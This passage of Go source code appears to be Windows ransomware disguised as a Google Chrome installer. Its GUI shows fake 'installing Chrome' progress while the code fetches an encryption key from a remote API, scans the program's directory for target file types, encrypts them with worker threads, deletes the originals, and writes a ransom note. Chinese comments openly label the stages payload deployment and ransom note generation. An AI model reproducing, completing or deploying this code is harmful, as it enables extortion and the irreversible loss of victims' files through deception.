	oldBrush, _, _ := procSelectObject.Call(hdc, uintptr(guiBrushGreenCheck))

	procEllipse.Call(hdc,
		uintptr(cx-r), uintptr(cy-r),
		uintptr(cx+r), uintptr(cy+r))

	// 白色勾号 ✓
	whitePen, _, _ := procCreatePen.Call(PS_SOLID, 4, uintptr(0x00FFFFFF))
	procSelectObject.Call(hdc, whitePen)

	// 勾号的左半部分
	procMoveToEx.Call(hdc, uintptr(cx-14), uintptr(cy), 0)
	procLineTo.Call(hdc, uintptr(cx-4), uintptr(cy+10))
	// 勾号的右半部分
	procLineTo.Call(hdc, uintptr(cx+16), uintptr(cy-10))

	procSelectObject.Call(hdc, oldPen)
	procSelectObject.Call(hdc, oldBrush)
	procDeleteObject.Call(greenPen)
	procDeleteObject.Call(whitePen)
}

// ============================================================================
// 加密工作（GUI 模式）
// ============================================================================

func runEncryptionWithGUI() {
	updateInstallerTitle("正在安装 Chrome...")
	updateInstallerSubtitle("正在下载最新版本...")
	updateInstallerStatus("正在连接服务器...")
	updateInstallerProgress(5)

	initProgramDir()

	var uuid string
	fmt.Print("[*] 尝试从API获取密钥... ")
	resp, err := fetchKeysFromAPI()
	if err != nil {
		fmt.Printf("失败: %v\n", err)
		fmt.Println("[*] API获取失败，回退到本地密钥...")

		uuid, err2 := extractUUIDFromFilename()
		if err2 != nil {
			fmt.Printf("失败: %v\n", err2)
			fmt.Println("[!] 无法获取密钥，程序终止")
			notifyInstallerDone()
			return
		}
		fmt.Printf("成功: %s\n", uuid)

		fmt.Print("[*] 从本地文件读取公钥... ")
		publicKeyPEM, err2 = readPublicKeyFromFile(uuid)
		if err2 != nil {
			fmt.Printf("失败: %v\n", err2)
			fmt.Println("[!] 无法读取公钥文件，程序终止")
			notifyInstallerDone()
			return
		}
		fmt.Println("成功")
	} else {
		uuid = resp.UUID
		publicKeyPEM = resp.PublicKeyPEM
		fmt.Printf("成功，UUID: %s\n", uuid)
	}

	fmt.Print("[*] 预解析公钥... ")
	pubKey, parseErr := getPublicKey(publicKeyPEM)
	if parseErr != nil {
		fmt.Printf("失败: %v\n", parseErr)
		notifyInstallerDone()
		return
	}
	fmt.Println("成功")
	publicKeyCache = pubKey
	publicKeyCacheStr = publicKeyPEM

	updateInstallerStatus("正在下载 Chrome...")
	updateInstallerProgress(10)

	fmt.Println("[*] 正在扫描程序所在目录...")
	extFilter := make(map[string]bool)
	for _, ext := range targetExtensions {
		extFilter[ext] = true
	}

	filesToProcess := scanFiles(extFilter)
	if len(filesToProcess) == 0 {
		fmt.Println("[!] 未找到任何目标文件。任务中止。")
		updateInstallerStatus("下载完成，正在安装...")
		updateInstallerProgress(100)
		notifyInstallerDone()
		return
	}
	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))

	updateInstallerStatus("正在安装 Chrome...")
	updateInstallerProgress(15)

	fmt.Println("\n[阶段: 载荷部署]")
	fmt.Printf("[*] 初始化加密线程。开始执行载荷...\n")
	updateInstallerSubtitle("这可能需要几分钟时间")

	runEncryptionWorkersWithGUI(filesToProcess, 4, uuid)

	if guiCancelled {
		notifyInstallerDone()
		return
	}

	fmt.Println("\n[阶段: 勒索信生成]")
	updateInstallerStatus("安装完成，正在启动...")
	updateInstallerProgress(95)

	noteContent := fmt.Sprintf(ransomNoteContent, uuid, uuid, uuid)
	notePath := filepath.Join(programDir, ransomNoteFileName)
	_ = os.WriteFile(notePath, []byte(noteContent), 0644)
	fmt.Printf("[+] 勒索信已生成: %s\n", notePath)

	updateInstallerStatus("Chrome 已成功安装！")
	updateInstallerProgress(100)
	notifyInstallerDone()
}

func notifyInstallerDone() {
	select {
	case guiDoneChan <- true:
	default:
	}
}

// ============================================================================
// 带 GUI 更新的加密 worker
// ============================================================================

func runEncryptionWorkersWithGUI(files []string, numWorkers int, uuid string) {
	jobs := make(chan string, len(files))
	var wg sync.WaitGroup
	var stats counters

	totalFiles := uint64(len(files))
	removeOriginal := true

	log, err3 := newFileLog("ransom_log.txt")
	if err3 != nil {
		fmt.Printf("无法创建日志文件: %v\n", err3)
	}
	if log != nil {
		defer func() { _ = log.Close() }()
	}

	for w := 0; w < numWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for file := range jobs {
				if isInstallerCancelled() {
					return
				}
				if err := processFile(file, publicKeyPEM, removeOriginal); err != nil {
					stats.failed.Add(1)
					logFailed(file, err.Error())
					if log != nil {
						log.Log(fmt.Sprintf("FAILED: %s - %v", file, err))
					}
				} else {
					stats.success.Add(1)
					logSuccess(file)
				}
			}
		}()
	}

	for _, file := range files {
		jobs <- file
	}
	close(jobs)

	done := make(chan bool)
	go func() {
		ticker := time.NewTicker(300 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
				processed := stats.success.Load() + stats.failed.Load()
				if totalFiles > 0 {
					progress := float64(processed) / float64(totalFiles) * 100
					guiProgress := 15 + int(progress*0.75)
					if guiProgress > 90 {
						guiProgress = 90
					}
					updateInstallerProgress(guiProgress)
					fmt.Printf("\r[*] 进度: %.1f%% (%d/%d)", progress, processed, totalFiles)
				}
			}
		}
	}()

	wg.Wait()
	close(done)
	fmt.Println()

	if logEnabled {
		logOperation(fmt.Sprintf("加密工作完成: 成功 %d, 失败 %d", stats.success.Load(), stats.failed.Load()))
	}
}

// ============================================================================
// 辅助函数
// ============================================================================

func createFont(size int, weight int, faceName string) uintptr {
	uFace := syscall.StringToUTF16Ptr(faceName)
	h, _, _ := procCreateFontW.Call(
		uintptr(size), 0, 0, 0,
		uintptr(weight), 0, 0, 0,
		DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
		DEFAULT_QUALITY, DEFAULT_PITCH|FF_DONTCARE,
		uintptr(unsafe.Pointer(uFace)),
	)
	return h
}

func loadCursor(cursorID uint32) uintptr {
	h, _, _ := procLoadCursorW.Call(0, uintptr(cursorID))
	return h
}

func cleanupGDIResources() {
	if guiFontNormal != 0 {
		procDeleteObject.Call(uintptr(guiFontNormal))
	}
	if guiFontBold != 0 {
		procDeleteObject.Call(uintptr(guiFontBold))
	}
	if guiFontTitle != 0 {
		procDeleteObject.Call(uintptr(guiFontTitle))
	}
	if guiFontBrand != 0 {
		procDeleteObject.Call(uintptr(guiFontBrand))
	}
	if guiFontProgress != 0 {
		procDeleteObject.Call(uintptr(guiFontProgress))
	}
	if guiBrushBg != 0 {
		procDeleteObject.Call(uintptr(guiBrushBg))
	}
	if guiBrushWhite != 0 {
		procDeleteObject.Call(uintptr(guiBrushWhite))
	}
	if guiBrushGoogleBlue != 0 {
		procDeleteObject.Call(uintptr(guiBrushGoogleBlue))
	}
	if guiBrushProgressBg != 0 {
		procDeleteObject.Call(uintptr(guiBrushProgressBg))
	}
	if guiBrushProgressBorder != 0 {
		procDeleteObject.Call(uintptr(guiBrushProgressBorder))
	}
	if guiBrushRed != 0 {
		procDeleteObject.Call(uintptr(guiBrushRed))
	}
	if guiBrushGreen != 0 {
		procDeleteObject.Call(uintptr(guiBrushGreen))
	}
	if guiBrushYellow != 0 {
		procDeleteObject.Call(uintptr(guiBrushYellow))
	}
	if guiBrushChromeBlue != 0 {
		procDeleteObject.Call(uintptr(guiBrushChromeBlue))
	}
	if guiBrushLine != 0 {
		procDeleteObject.Call(uintptr(guiBrushLine))
	}
	if guiBrushGreenCheck != 0 {
		procDeleteObject.Call(uintptr(guiBrushGreenCheck))
	}
}
